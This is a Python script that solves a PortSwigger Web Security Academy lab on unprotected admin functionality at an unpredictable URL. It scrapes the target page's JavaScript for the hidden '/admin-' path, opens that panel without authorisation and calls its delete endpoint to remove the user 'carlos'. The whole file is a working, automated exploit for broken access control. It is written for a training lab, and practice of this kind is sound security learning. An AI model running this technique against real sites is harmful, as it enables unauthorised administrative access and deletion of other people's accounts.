# Unprotected admin functionality with unpredictable URL

# https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def delete_carlos(s, url):
	print('[+] Trying to catch Session cookie...')
	session_cookie = s.cookies.get('session')
	print('[+] Session cookie found: %s.' % session_cookie)
	print("\n[+] Searching admin panel ...")
	r = s.get(url)
	time.sleep(1)
	soup = BeautifulSoup(r.text, 'lxml')
	admin_instances = soup.find(string=re.compile('/admin-'))
	admin_panel_path = re.search("href', '(.*)'", admin_instances).group(1)
	print(admin_panel_path)
	cookies = {'session': session_cookie}
	print("[+] Searching admin panel '%s' ..." % admin_panel_path)
	r = s.get(url + admin_panel_path, cookies=cookies)
	time.sleep(1)
	if r.status_code == 200:
		print("[+] Admin panel '%s' exists !" % admin_panel_path)
		delete_action = url + admin_panel_path + '/delete?username=carlos'
		print('\n[+] Trying to delete Carlos user...')
		r = s.get(delete_action, cookies=cookies)
		time.sleep(1)
		if ('User deleted successfully!' in r.text) or (r.status_code == 302) or (r.status_code == 200):
			print('[+] Carlos user successfully deleted !')
		else:
			print('[-] Exploit failed to delete Carlos user !!!')
	else:
		print('[-] Exploit failed to find admin panel !!!')


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Unprotected admin functionality with unpredictable URL')
	parser = argparse.ArgumentParser(description="[+] Lab: Unprotected admin functionality with unpredictable URL")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(args.url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find Unprotected Path to delete Carlos user...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(args.url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			time.sleep(2)
			r = delete_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
